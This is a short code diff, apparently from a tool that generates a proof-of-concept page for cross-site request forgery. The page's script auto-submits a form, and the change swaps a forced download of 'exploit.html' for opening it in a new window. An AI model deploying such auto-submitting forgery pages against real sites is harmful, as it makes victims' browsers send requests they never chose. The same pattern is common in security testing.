@@ -9,11 +9,6 @@
     <script>document.forms[0].submit()</scr` + `ipt>
   </body></html>
 `; 
-
 const blob = new Blob([html], { type: 'text/html' });
 const url = URL.createObjectURL(blob);
-const a = document.createElement('a');
-a.href = url;
-a.download = 'exploit.html';  // ép trình duyệt tải về
-a.click();
-</script>
+window.open(url, '_blank');
